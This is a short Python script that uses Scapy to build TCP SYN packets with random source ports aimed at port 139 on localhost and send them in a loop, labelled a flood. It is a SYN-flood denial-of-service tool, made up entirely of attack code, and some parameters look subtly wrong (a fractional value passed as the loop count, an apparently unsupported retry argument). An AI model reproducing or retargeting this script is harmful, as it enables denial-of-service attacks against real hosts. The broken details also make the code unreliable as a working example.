import sys
from scapy.all import *

target = "127.0.0.1"
dest_port = 139
flood_rate = 0.2

# set large TTL
ip_layer = IP(dst = target, ttl = 200)

# build SYN packet with random source port
tcp_layer = TCP(sport = RandShort(), dport = 139, flags = "S")

packet = ip_layer/tcp_layer

# begin flood
ans, unans = srloop(packet, iter = flood_rate, retry = 3, timeout = 5)
